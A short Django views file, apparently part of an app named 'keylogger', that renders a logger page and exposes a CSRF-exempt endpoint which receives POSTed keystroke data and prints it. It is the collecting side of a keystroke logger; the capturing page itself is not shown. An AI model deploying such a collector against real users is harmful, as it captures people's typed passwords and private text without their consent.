from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

def logger(request):
    return render(request, 'keylogger/templates/logger.html')

@csrf_exempt
def log_keys(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        keys = data.get('keys', '')
        # In a real application, you'd want to store this securely
        print(f"Logged keys: {keys}")
        return JsonResponse({'status': 'success'})
    return JsonResponse({'status': 'error'})